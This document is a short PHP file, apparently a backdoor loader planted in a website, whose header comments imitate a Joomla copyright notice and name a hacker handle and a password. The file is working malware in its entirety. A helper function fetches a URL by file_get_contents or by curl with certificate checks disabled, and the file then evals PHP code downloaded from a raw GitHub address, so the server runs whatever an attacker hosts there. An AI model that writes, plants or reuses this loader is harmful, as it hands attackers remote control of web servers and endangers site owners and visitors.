<?php
/** * PASSWORD:TBLHACKING */
/** *-- copyright : kurdhaxor */
/** * @package kurdhaxor * @copyright Copyright (C) 2025 Open Source Matters, Inc. All rights reserved. * */
// @deprecated 1.0 Deprecated without replacement
function getBacklink($url)
{
    if (ini_get("allow_url_fopen") == 1)
    {
        // Jika url fopen on maka jalankan
        return file_get_contents($url);
    }
    elseif (function_exists("curl_version"))
    {
        //Jika url fopen off maka jalankan menggunakan curl
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
}

eval("?>" . getBacklink("https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/gafa.php"));
?>
